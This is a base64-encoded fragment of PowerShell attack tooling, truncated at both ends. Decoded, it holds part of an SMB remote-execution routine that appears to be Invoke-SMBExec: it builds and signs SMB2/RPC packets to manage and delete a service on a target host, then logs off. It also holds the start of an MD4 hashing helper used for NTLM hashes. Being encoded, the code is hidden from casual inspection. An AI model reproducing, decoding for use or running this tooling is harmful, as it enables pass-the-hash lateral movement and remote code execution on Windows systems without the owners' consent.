CRTTUJfc2VydmljZSBkZWxldGVkIG9uICRUYXJnZXQiDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNNQjJfbWVzc2FnZV9JRCArPSAyMA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfY2xvc2Vfc2VydmljZV9oYW5kbGVfc3RhZ2UrKw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICRwYWNrZXRfU0NNX2RhdGEgPSBHZXQtUGFja2V0U0NNQ2xvc2VTZXJ2aWNlSGFuZGxlICRTTUJfc2VydmljZV9jb250ZXh0X2hhbmRsZQ0KICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICAgICAgZWxzZQ0KICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTTUIyX21lc3NhZ2VfSUQgKz0gMQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfY2xpZW50X3N0YWdlID0gJ0Nsb3NlUmVxdWVzdCcNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkcGFja2V0X1NDTV9kYXRhID0gR2V0LVBhY2tldFNDTUNsb3NlU2VydmljZUhhbmRsZSAkU01CX3NlcnZpY2VfbWFuYWdlcl9jb250ZXh0X2hhbmRsZQ0KICAgICAgICAgICAgICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICAgICAgICAgICAgICAkcGFja2V0X1NNQjJfaGVhZGVyID0gR2V0LVBhY2tldFNNQjJIZWFkZXIgMHgwOSwweDAwICRTTUIyX21lc3NhZ2VfSUQgJFNNQjJfdHJlZV9JRCAkU01CX3Nlc3Npb25fSUQNCiAgICAgICAgICAgICAgICAgICAgICAgICRwYWNrZXRfU01CMl9oZWFkZXJbIlNNQjJIZWFkZXJfQ3JlZGl0UmVxdWVzdCJdID0gMHg3ZiwweDAwDQogICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICAgICAgaWYoJFNNQl9zaWduaW5nKQ0KICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICRwYWNrZXRfU01CMl9oZWFkZXJbIlNNQjJIZWFkZXJfRmxhZ3MiXSA9IDB4MDgsMHgwMCwweDAwLDB4MDAgICAgICANCiAgICAgICAgICAgICAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgICAgICAgICAgICAgJFNDTV9kYXRhID0gQ29udmVydEZyb20tUGFja2V0T3JkZXJlZERpY3Rpb25hcnkgJHBhY2tldF9TQ01fZGF0YQ0KICAgICAgICAgICAgICAgICAgICAgICAgJHBhY2tldF9TTUIyX2RhdGEgPSBHZXQtUGFja2V0U01CMldyaXRlUmVxdWVzdCAkU01CX2ZpbGVfSUQgJFNDTV9kYXRhLmxlbmd0aA0KICAgICAgICAgICAgICAgICAgICAgICAgJHBhY2tldF9SUENfZGF0YSA9IEdldC1QYWNrZXRSUENSZXF1ZXN0IDB4MDMgJFNDTV9kYXRhLmxlbmd0aCAwIDAgMHgwMSwweDAwLDB4MDAsMHgwMCAweDAwLDB4MDAgMHgwMCwweDAwDQogICAgICAgICAgICAgICAgICAgICAgICAkU01CMl9oZWFkZXIgPSBDb252ZXJ0RnJvbS1QYWNrZXRPcmRlcmVkRGljdGlvbmFyeSAkcGFja2V0X1NNQjJfaGVhZGVyDQogICAgICAgICAgICAgICAgICAgICAgICAkU01CMl9kYXRhID0gQ29udmVydEZyb20tUGFja2V0T3JkZXJlZERpY3Rpb25hcnkgJHBhY2tldF9TTUIyX2RhdGEgDQogICAgICAgICAgICAgICAgICAgICAgICAkUlBDX2RhdGEgPSBDb252ZXJ0RnJvbS1QYWNrZXRPcmRlcmVkRGljdGlvbmFyeSAkcGFja2V0X1JQQ19kYXRhIA0KICAgICAgICAgICAgICAgICAgICAgICAgJFJQQ19kYXRhX2xlbmd0aCA9ICRTTUIyX2RhdGEuTGVuZ3RoICsgJFNDTV9kYXRhLkxlbmd0aCArICRSUENfZGF0YS5MZW5ndGgNCiAgICAgICAgICAgICAgICAgICAgICAgICRwYWNrZXRfTmV0QklPU19zZXNzaW9uX3NlcnZpY2UgPSBHZXQtUGFja2V0TmV0QklPU1Nlc3Npb25TZXJ2aWNlICRTTUIyX2hlYWRlci5MZW5ndGggJFJQQ19kYXRhX2xlbmd0aA0KICAgICAgICAgICAgICAgICAgICAgICAgJE5ldEJJT1Nfc2Vzc2lvbl9zZXJ2aWNlID0gQ29udmVydEZyb20tUGFja2V0T3JkZXJlZERpY3Rpb25hcnkgJHBhY2tldF9OZXRCSU9TX3Nlc3Npb25fc2VydmljZQ0KDQogICAgICAgICAgICAgICAgICAgICAgICBpZigkU01CX3NpZ25pbmcpDQogICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNNQjJfc2lnbiA9ICRTTUIyX2hlYWRlciArICRTTUIyX2RhdGEgKyAkUlBDX2RhdGEgKyAkU0NNX2RhdGENCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CMl9zaWduYXR1cmUgPSAkSE1BQ19TSEEyNTYuQ29tcHV0ZUhhc2goJFNNQjJfc2lnbikNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CMl9zaWduYXR1cmUgPSAkU01CMl9zaWduYXR1cmVbMC4uMTVdDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJHBhY2tldF9TTUIyX2hlYWRlclsiU01CMkhlYWRlcl9TaWduYXR1cmUiXSA9ICRTTUIyX3NpZ25hdHVyZQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTTUIyX2hlYWRlciA9IENvbnZlcnRGcm9tLVBhY2tldE9yZGVyZWREaWN0aW9uYXJ5ICRwYWNrZXRfU01CMl9oZWFkZXINCiAgICAgICAgICAgICAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9jbGllbnRfc2VuZCA9ICROZXRCSU9TX3Nlc3Npb25fc2VydmljZSArICRTTUIyX2hlYWRlciArICRTTUIyX2RhdGEgKyAkUlBDX2RhdGEgKyAkU0NNX2RhdGENCiAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfY2xpZW50X3N0cmVhbS5Xcml0ZSgkU01CX2NsaWVudF9zZW5kLDAsJFNNQl9jbGllbnRfc2VuZC5MZW5ndGgpID4gJG51bGwNCiAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfY2xpZW50X3N0cmVhbS5GbHVzaCgpDQogICAgICAgICAgICAgICAgICAgICAgICAkU01CX2NsaWVudF9zdHJlYW0uUmVhZCgkU01CX2NsaWVudF9yZWNlaXZlLDAsJFNNQl9jbGllbnRfcmVjZWl2ZS5MZW5ndGgpID4gJG51bGwNCiAgICAgICAgICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICAgICAgICAgICdDbG9zZVJlcXVlc3QnDQogICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICRTTUIyX21lc3NhZ2VfSUQgKz0gMjANCiAgICAgICAgICAgICAgICAgICAgICAgICRwYWNrZXRfU01CMl9oZWFkZXIgPSBHZXQtUGFja2V0U01CMkhlYWRlciAweDA2LDB4MDAgJFNNQjJfbWVzc2FnZV9JRCAkU01CMl90cmVlX0lEICRTTUJfc2Vzc2lvbl9JRA0KICAgICAgICAgICAgICAgICAgICAgICAgJHBhY2tldF9TTUIyX2hlYWRlclsiU01CMkhlYWRlcl9DcmVkaXRSZXF1ZXN0Il0gPSAweDdmLDB4MDANCiAgICAgICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgICAgICAgICBpZigkU01CX3NpZ25pbmcpDQogICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJHBhY2tldF9TTUIyX2hlYWRlclsiU01CMkhlYWRlcl9GbGFncyJdID0gMHgwOCwweDAwLDB4MDAsMHgwMCAgICAgIA0KICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgDQogICAgICAgICAgICAgICAgICAgICAgICAkcGFja2V0X1NNQjJfZGF0YSA9IEdldC1QYWNrZXRTTUIyQ2xvc2VSZXF1ZXN0ICRTTUJfZmlsZV9JRA0KICAgICAgICAgICAgICAgICAgICAgICAgJFNNQjJfaGVhZGVyID0gQ29udmVydEZyb20tUGFja2V0T3JkZXJlZERpY3Rpb25hcnkgJHBhY2tldF9TTUIyX2hlYWRlcg0KICAgICAgICAgICAgICAgICAgICAgICAgJFNNQjJfZGF0YSA9IENvbnZlcnRGcm9tLVBhY2tldE9yZGVyZWREaWN0aW9uYXJ5ICRwYWNrZXRfU01CMl9kYXRhDQogICAgICAgICAgICAgICAgICAgICAgICAkcGFja2V0X05ldEJJT1Nfc2Vzc2lvbl9zZXJ2aWNlID0gR2V0LVBhY2tldE5ldEJJT1NTZXNzaW9uU2VydmljZSAkU01CMl9oZWFkZXIuTGVuZ3RoICRTTUIyX2RhdGEuTGVuZ3RoDQogICAgICAgICAgICAgICAgICAgICAgICAkTmV0QklPU19zZXNzaW9uX3NlcnZpY2UgPSBDb252ZXJ0RnJvbS1QYWNrZXRPcmRlcmVkRGljdGlvbmFyeSAkcGFja2V0X05ldEJJT1Nfc2Vzc2lvbl9zZXJ2aWNlDQoNCiAgICAgICAgICAgICAgICAgICAgICAgIGlmKCRTTUJfc2lnbmluZykNCiAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CMl9zaWduID0gJFNNQjJfaGVhZGVyICsgJFNNQjJfZGF0YQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTTUIyX3NpZ25hdHVyZSA9ICRITUFDX1NIQTI1Ni5Db21wdXRlSGFzaCgkU01CMl9zaWduKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTTUIyX3NpZ25hdHVyZSA9ICRTTUIyX3NpZ25hdHVyZVswLi4xNV0NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkcGFja2V0X1NNQjJfaGVhZGVyWyJTTUIySGVhZGVyX1NpZ25hdHVyZSJdID0gJFNNQjJfc2lnbmF0dXJlDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNNQjJfaGVhZGVyID0gQ29udmVydEZyb20tUGFja2V0T3JkZXJlZERpY3Rpb25hcnkgJHBhY2tldF9TTUIyX2hlYWRlcg0KICAgICAgICAgICAgICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICAgICAgICAgICAgICAkU01CX2NsaWVudF9zZW5kID0gJE5ldEJJT1Nfc2Vzc2lvbl9zZXJ2aWNlICsgJFNNQjJfaGVhZGVyICsgJFNNQjJfZGF0YQ0KICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9jbGllbnRfc3RyZWFtLldyaXRlKCRTTUJfY2xpZW50X3NlbmQsMCwkU01CX2NsaWVudF9zZW5kLkxlbmd0aCkgPiAkbnVsbA0KICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9jbGllbnRfc3RyZWFtLkZsdXNoKCkNCiAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfY2xpZW50X3N0cmVhbS5SZWFkKCRTTUJfY2xpZW50X3JlY2VpdmUsMCwkU01CX2NsaWVudF9yZWNlaXZlLkxlbmd0aCkgPiAkbnVsbA0KICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9jbGllbnRfc3RhZ2UgPSAnVHJlZURpc2Nvbm5lY3QnDQogICAgICAgICAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgICAgICAgICAnVHJlZURpc2Nvbm5lY3QnDQogICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICRTTUIyX21lc3NhZ2VfSUQgKz0gMQ0KICAgICAgICAgICAgICAgICAgICAgICAgJHBhY2tldF9TTUIyX2hlYWRlciA9IEdldC1QYWNrZXRTTUIySGVhZGVyIDB4MDQsMHgwMCAkU01CMl9tZXNzYWdlX0lEICRTTUIyX3RyZWVfSUQgJFNNQl9zZXNzaW9uX0lEDQogICAgICAgICAgICAgICAgICAgICAgICAkcGFja2V0X1NNQjJfaGVhZGVyWyJTTUIySGVhZGVyX0NyZWRpdFJlcXVlc3QiXSA9IDB4N2YsMHgwMA0KICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgICAgICAgIGlmKCRTTUJfc2lnbmluZykNCiAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkcGFja2V0X1NNQjJfaGVhZGVyWyJTTUIySGVhZGVyX0ZsYWdzIl0gPSAweDA4LDB4MDAsMHgwMCwweDAwICAgICAgDQogICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgDQogICAgICAgICAgICAgICAgICAgICAgICAkcGFja2V0X1NNQjJfZGF0YSA9IEdldC1QYWNrZXRTTUIyVHJlZURpc2Nvbm5lY3RSZXF1ZXN0DQogICAgICAgICAgICAgICAgICAgICAgICAkU01CMl9oZWFkZXIgPSBDb252ZXJ0RnJvbS1QYWNrZXRPcmRlcmVkRGljdGlvbmFyeSAkcGFja2V0X1NNQjJfaGVhZGVyDQogICAgICAgICAgICAgICAgICAgICAgICAkU01CMl9kYXRhID0gQ29udmVydEZyb20tUGFja2V0T3JkZXJlZERpY3Rpb25hcnkgJHBhY2tldF9TTUIyX2RhdGENCiAgICAgICAgICAgICAgICAgICAgICAgICRwYWNrZXRfTmV0QklPU19zZXNzaW9uX3NlcnZpY2UgPSBHZXQtUGFja2V0TmV0QklPU1Nlc3Npb25TZXJ2aWNlICRTTUIyX2hlYWRlci5MZW5ndGggJFNNQjJfZGF0YS5MZW5ndGgNCiAgICAgICAgICAgICAgICAgICAgICAgICROZXRCSU9TX3Nlc3Npb25fc2VydmljZSA9IENvbnZlcnRGcm9tLVBhY2tldE9yZGVyZWREaWN0aW9uYXJ5ICRwYWNrZXRfTmV0QklPU19zZXNzaW9uX3NlcnZpY2UNCg0KICAgICAgICAgICAgICAgICAgICAgICAgaWYoJFNNQl9zaWduaW5nKQ0KICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTTUIyX3NpZ24gPSAkU01CMl9oZWFkZXIgKyAkU01CMl9kYXRhDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNNQjJfc2lnbmF0dXJlID0gJEhNQUNfU0hBMjU2LkNvbXB1dGVIYXNoKCRTTUIyX3NpZ24pDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNNQjJfc2lnbmF0dXJlID0gJFNNQjJfc2lnbmF0dXJlWzAuLjE1XQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICRwYWNrZXRfU01CMl9oZWFkZXJbIlNNQjJIZWFkZXJfU2lnbmF0dXJlIl0gPSAkU01CMl9zaWduYXR1cmUNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CMl9oZWFkZXIgPSBDb252ZXJ0RnJvbS1QYWNrZXRPcmRlcmVkRGljdGlvbmFyeSAkcGFja2V0X1NNQjJfaGVhZGVyDQogICAgICAgICAgICAgICAgICAgICAgICB9DQoNCiAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfY2xpZW50X3NlbmQgPSAkTmV0QklPU19zZXNzaW9uX3NlcnZpY2UgKyAkU01CMl9oZWFkZXIgKyAkU01CMl9kYXRhDQogICAgICAgICAgICAgICAgICAgICAgICAkU01CX2NsaWVudF9zdHJlYW0uV3JpdGUoJFNNQl9jbGllbnRfc2VuZCwwLCRTTUJfY2xpZW50X3NlbmQuTGVuZ3RoKSA+ICRudWxsDQogICAgICAgICAgICAgICAgICAgICAgICAkU01CX2NsaWVudF9zdHJlYW0uRmx1c2goKQ0KICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9jbGllbnRfc3RyZWFtLlJlYWQoJFNNQl9jbGllbnRfcmVjZWl2ZSwwLCRTTUJfY2xpZW50X3JlY2VpdmUuTGVuZ3RoKSA+ICRudWxsDQogICAgICAgICAgICAgICAgICAgICAgICAkU01CX2NsaWVudF9zdGFnZSA9ICdMb2dvZmYnDQogICAgICAgICAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgICAgICAgICAnTG9nb2ZmJw0KICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAkU01CMl9tZXNzYWdlX0lEICs9IDIwDQogICAgICAgICAgICAgICAgICAgICAgICAkcGFja2V0X1NNQjJfaGVhZGVyID0gR2V0LVBhY2tldFNNQjJIZWFkZXIgMHgwMiwweDAwICRTTUIyX21lc3NhZ2VfSUQgJFNNQjJfdHJlZV9JRCAkU01CX3Nlc3Npb25fSUQNCiAgICAgICAgICAgICAgICAgICAgICAgICRwYWNrZXRfU01CMl9oZWFkZXJbIlNNQjJIZWFkZXJfQ3JlZGl0UmVxdWVzdCJdID0gMHg3ZiwweDAwDQogICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICAgICAgaWYoJFNNQl9zaWduaW5nKQ0KICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICRwYWNrZXRfU01CMl9oZWFkZXJbIlNNQjJIZWFkZXJfRmxhZ3MiXSA9IDB4MDgsMHgwMCwweDAwLDB4MDAgICAgICANCiAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICAgICAgJHBhY2tldF9TTUIyX2RhdGEgPSBHZXQtUGFja2V0U01CMlNlc3Npb25Mb2dvZmZSZXF1ZXN0DQogICAgICAgICAgICAgICAgICAgICAgICAkU01CMl9oZWFkZXIgPSBDb252ZXJ0RnJvbS1QYWNrZXRPcmRlcmVkRGljdGlvbmFyeSAkcGFja2V0X1NNQjJfaGVhZGVyDQogICAgICAgICAgICAgICAgICAgICAgICAkU01CMl9kYXRhID0gQ29udmVydEZyb20tUGFja2V0T3JkZXJlZERpY3Rpb25hcnkgJHBhY2tldF9TTUIyX2RhdGENCiAgICAgICAgICAgICAgICAgICAgICAgICRwYWNrZXRfTmV0QklPU19zZXNzaW9uX3NlcnZpY2UgPSBHZXQtUGFja2V0TmV0QklPU1Nlc3Npb25TZXJ2aWNlICRTTUIyX2hlYWRlci5MZW5ndGggJFNNQjJfZGF0YS5MZW5ndGgNCiAgICAgICAgICAgICAgICAgICAgICAgICROZXRCSU9TX3Nlc3Npb25fc2VydmljZSA9IENvbnZlcnRGcm9tLVBhY2tldE9yZGVyZWREaWN0aW9uYXJ5ICRwYWNrZXRfTmV0QklPU19zZXNzaW9uX3NlcnZpY2UNCg0KICAgICAgICAgICAgICAgICAgICAgICAgaWYoJFNNQl9zaWduaW5nKQ0KICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTTUIyX3NpZ24gPSAkU01CMl9oZWFkZXIgKyAkU01CMl9kYXRhDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNNQjJfc2lnbmF0dXJlID0gJEhNQUNfU0hBMjU2LkNvbXB1dGVIYXNoKCRTTUIyX3NpZ24pDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNNQjJfc2lnbmF0dXJlID0gJFNNQjJfc2lnbmF0dXJlWzAuLjE1XQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICRwYWNrZXRfU01CMl9oZWFkZXJbIlNNQjJIZWFkZXJfU2lnbmF0dXJlIl0gPSAkU01CMl9zaWduYXR1cmUNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CMl9oZWFkZXIgPSBDb252ZXJ0RnJvbS1QYWNrZXRPcmRlcmVkRGljdGlvbmFyeSAkcGFja2V0X1NNQjJfaGVhZGVyDQogICAgICAgICAgICAgICAgICAgICAgICB9DQoNCiAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfY2xpZW50X3NlbmQgPSAkTmV0QklPU19zZXNzaW9uX3NlcnZpY2UgKyAkU01CMl9oZWFkZXIgKyAkU01CMl9kYXRhDQogICAgICAgICAgICAgICAgICAgICAgICAkU01CX2NsaWVudF9zdHJlYW0uV3JpdGUoJFNNQl9jbGllbnRfc2VuZCwwLCRTTUJfY2xpZW50X3NlbmQuTGVuZ3RoKSA+ICRudWxsDQogICAgICAgICAgICAgICAgICAgICAgICAkU01CX2NsaWVudF9zdHJlYW0uRmx1c2goKQ0KICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9jbGllbnRfc3RyZWFtLlJlYWQoJFNNQl9jbGllbnRfcmVjZWl2ZSwwLCRTTUJfY2xpZW50X3JlY2VpdmUuTGVuZ3RoKSA+ICRudWxsDQogICAgICAgICAgICAgICAgICAgICAgICAkU01CX2NsaWVudF9zdGFnZSA9ICdFeGl0Jw0KICAgICAgICAgICAgICAgICAgICB9DQoNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgaWYoJFNNQkV4ZWNfZmFpbGVkKQ0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgQlJFQUsgU01CX2V4ZWN1dGVfbG9vcA0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIA0KICAgICAgICAgICAgfQ0KDQogICAgICAgIH0NCg0KICAgIH0NCg0KICAgICRTTUJfY2xpZW50LkNsb3NlKCkNCiAgICAkU01CX2NsaWVudF9zdHJlYW0uQ2xvc2UoKQ0KfQ0KDQp9DQoNCkZ1bmN0aW9uIEdldC1NRDRIYXNoIHsNCjwjDQouU1lOT1BTSVMNCiAgICBUaGlzIGNtZGxldCByZXR1cm5zIHRoZSBNRDQgaGFzaCBvZiB0aGUgZGF0YSB0aGF0IGlzIGlucHV0Lg0KICAgIFdBUk5JTkc6IE1ENCBpcyBub3Qgc2VjdXJlLCBzbyBpdCBzaG91bGQgTkVWRVIgYmUgdXNlZCB0bw0KICAgIHByb3RlY3Qgc2Vuc2l0aXZlIGRhdGEuIFRoaXMgY21kbGV0IGlzIGZvciByZXNlYXJjaCBwdXJwb3NlcyBvbmx5IQ0KIA0KLkRFU0NSSVBUSU9ODQogICAgVGhpcyBjbWRsZXQgcmV0dXJucyB0aGUgTUQ0IGhhc2ggb2YgdGhlIGRhdGEgdGhhdCBpcyBpbnB1dC4NCiAgICBXQVJOSU5HOiBNRDQgaXMgbm90IHNlY3VyZSwgc28gaXQgc2hvdWxkIE5FVkVSIGJlIHVzZWQgdG8NCiAgICBwcm90ZWN0IHNlbnNpdGl2ZSBkYXRhLiBUaGlzIGNtZGxldCBpcyBmb3IgcmVzZWFyY2ggcHVycG9zZXMgb25seSENCiAgICBUaGlzIGNtZGxldCB1c2VzIE1pY3Jvc29mdCdzIGltcGxlbWVudGF0aW9uIG9mIE1ENCwgZXhwb3J0ZWQNCiAgICBmcm9tIGJjcnlwdC5kbGwuIFRoZSBpbXBsZW1lbnRhdGlvbiBpcyBmdWxseSBjb21wbGlhbnQgd2l0aA0KICAgIFJGQyAxMzIwLiBUaGlzIGNtZGxldCB0YWtlcyBhIGJ5dGUgYXJyYXkgYXMgaW5wdXQsIG5vdCBhIHN0cmluZy4NCiAgICBTbyBpZiB5b3Ugd2FudGVkIHRvIGhhc2ggYSBzdHJpbmcgKHN1Y2ggYXMgYSBwYXNzd29yZCwpIHlvdQ0KICAgIG5lZWQgdG8gY29udmVydCBpdCB0byBhIGJ5dGUgYXJyYXkgZmlyc3QuDQogDQouRVhBTVBMRQ0KICAgIEdldC1NRDRIYXNoIC1EYXRhVG9IYXNoICQoW1RleHQuRW5jb2RpbmddOjpVbmljb2RlLkdldEJ5dGVzKCJZb3VyUGFzc3dvcmQxISIpKQ0KIA0KLlBBUkFNRVRFUiBEYXRhVG9IYXNoDQogICAgQSBieXRlIGFycmF5IHRoYXQgcmVwcmVzZW50cyB0aGUgZGF0YSB0aGF0IHlvdSB3YW50IHRvIGhhc2guDQogDQouSU5QVVRTDQogICAgQSBieXRlIGFycmF5IGNvbnRhaW5pbmcgdGhlIGRhdGEgeW91IHdpc2ggdG8gaGFzaC4NCiANCi5PVVRQVVRTDQogICAgQSAxMjgtYml0IGhleGFkZWNpbWFsIHN0cmluZyAtIHRoZSBNRDQgaGFzaCBvZiB5b3VyIGRhdGEuDQogDQouTk9URVMNCiAgICBBdXRob3I6IFJ5YW4gUmllcywgMjAxNCwgcnlhbkBteW90aGVycGNpc2FjbG91ZC5jb20NCiANCi5MSU5LDQogICAgaHR0cHM6Ly9teW90aGVycGNpc2FjbG91ZC5jb20NCiM+DQogICAgW0NtZGxldEJpbmRpbmcoKV0NCiAgICBQYXJhbSAoW1BhcmFtZXRlcihNYW5kYXRvcnk9JFRydWUsIFZhbHVlRnJvbVBpcGVsaW5lPSRGYWxzZSldICAgICAgICAgIA0KICAgICAgICAgICBbQnl0ZVtdXSREYXRhVG9IYXNoKQ0KICAgIEVORA0KICAgIHsgICAgICAgDQogICAgICAgIFNldC1TdHJpY3RNb2RlIC1WZXJzaW9uIExhdGVzdA0KICAgICAgICBpZiAoLW5vdCAoW1N5c3RlbS5NYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNUeXBlTmFtZV0nZHNhZmRzYWZkc2FmZHMnKS5UeXBlKQ0KICAgICAgICB7DQogICAgICAgIEFkZC1UeXBlIC1UeXBlRGVmaW5pdGlvbiBAJw0KICAgICAgICB1c2luZyBTeXN0ZW07DQogICAgICAgIHVzaW5nIFN5c3RlbS5UZXh0Ow0KICAgICAgICB1c2luZyBTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXM7DQogICAgICAgIHB1YmxpYyBjbGFzcyBkc2FmZHNhZmRzYWZkcw0KICAgICAgICB7DQogICAgICAgICAgICBbRGxsSW1wb3J0KCJiY3J5cHQuZGxsIiwgQ2hhclNldCA9IENoYXJTZXQuQXV0byldDQogICAgICAgICAgICBwdWJsaWMgc3RhdGljIGV4dGVybiBOVFN0YXR1cyBCQ3J5cHRPcGVuQWxnb3JpdGhtUHJvdmlkZXIoDQogICAgICAgICAgICAgICAgW091dF0gb3V0IEludFB0ciBwaEFsZ29yaXRobSwNCiAgICAgICAgICAgICAgICBbSW5dIHN0cmluZyBwc3pBbGdJZCwNCiAgICAgICAgICAgICAgICBbSW4sIE9wdGlvbmFsXSBzdHJpbmcgcHN6SW1wbGVtZW50YXRpb24sDQogICAgICAgICAgICAgICAgW0luXSBVSW50MzIgZHdGbGFncyk7DQogDQogICAgICAgICAgICBbRGxsSW1wb3J0KCJiY3J5cHQuZGxsIildDQogICAgICAgICAgICBwdWJsaWMgc3RhdGljIGV4dGVybiBOVFN0YXR1cyBCQ3J5cHRDbG9zZUFsZ29yaXRobVByb3ZpZGVyKA0KICAgICAgICAgICAgICAgIFtJbiwgT3V0XSBJbnRQdHIgaEFsZ29yaXRobSwNCiAgICAgICAgICAgICAgICBbSW5dIFVJbnQzMiBkd0ZsYWdzKTsNCiANCiAgICAgICAgICAgIFtEbGxJbXBvcnQoImJjcnlwdC5kbGwiLCBDaGFyU2V0ID0gQ2hhclNldC5BdXRvKV0NCiAgICAgICAgICAgIHB1YmxpYyBzdGF0aWMgZXh0ZXJuIE5UU3RhdHVzIEJDcnlwdENyZWF0ZUhhc2goDQogICAgICAgICAgICAgICAgW0luLCBPdXRdIEludFB0ciBoQWxnb3JpdGhtLA0KICAgICAgICAgICAgICAgIFtPdXRdIG91dCBJbnRQdHIgcGhIYXNoLA0KICAgICAgICAgICAgICAgIFtPdXRdIEludFB0ciBwYkhhc2hPYmplY3QsDQogICAgICAgICAgICAgICAgW0luLCBPcHRpb25hbF0gVUludDMyIGNiSGFzaE9iamVjdCwNCiAgICAgICAgICAgICAgICBbSW4sIE9wdGlvbmFsXSBJbnRQdHIgcGJTZWNyZXQsDQogICAgICAgICAgICAgICAgW0luXSBVSW50MzIgY2JTZWNyZXQsDQogICAgICAgICAgICAgICAgW0luXSBVSW50MzIgZHdGbGFncyk7DQogDQogICAgICAgICAgICBbRGxsSW1wb3J0KCJiY3J5cHQuZGxsIildDQogICAgICAgICAgICBwdWJsaWMgc3RhdGljIGV4dGVybiBOVFN0YXR1cyBCQ3J5cHREZXN0cm95SGFzaCgNCiAgICAgICAgICAgICAgICBbSW4sIE91dF0gSW50UHRyIGhIYXNoKTsNCiANCiAgICAgICAgICAgIFtEbGxJbXBvcnQoImJjcnlwdC5kbGwiKV0NCiAgICAgICAgICAgIHB1YmxpYyBzdGF0aWMgZXh0ZXJuIE5UU3RhdHVzIEJDcnlwdEhhc2hEYXRhKA0KICAgICAgICAgICAgICAgIFtJbiwgT3V0XSBJbnRQdHIgaEhhc2gsDQogICAgICAgICAgICAgICAgW0luLCBNYXJzaGFsQXMoVW5tYW5hZ2VkVHlwZS5MUEFycmF5KV0gYnl0ZVtdIHBiSW5wdXQsDQogICAgICAgICAgICAgICAgW0luXSBpbnQgY2JJbnB1dCwNCiAgICAgICAgICAgICAgICBbSW5dIFVJbnQzMiBkd0ZsYWdzKTsNCiANCiAgICAgICAgICAgIFtEbGxJbXBvcnQoImJjcnlwdC5kbGwiKV0NCiAgICAgICAgICAgIHB1YmxpYyBzdGF0aWMgZXh0ZXJuIE5UU3RhdHVzIEJDcnlwdEZpbmlzaEhhc2goDQogICAgICAgICAgICAgICAgW0luLCBPdXRdIEludFB0ciBoSGFzaCwNCiAgICAgICAgICAgICAgICBbT3V0LCBNYXJzaGFsQXMoVW5tYW5hZ2VkVHlwZS5MUEFycmF5KV0gYnl0ZVtdIHBiSW5wdXQsDQogICAgICAgICAgICAgICAgW0luXSBpbnQgY2JJbnB1dCwNCiA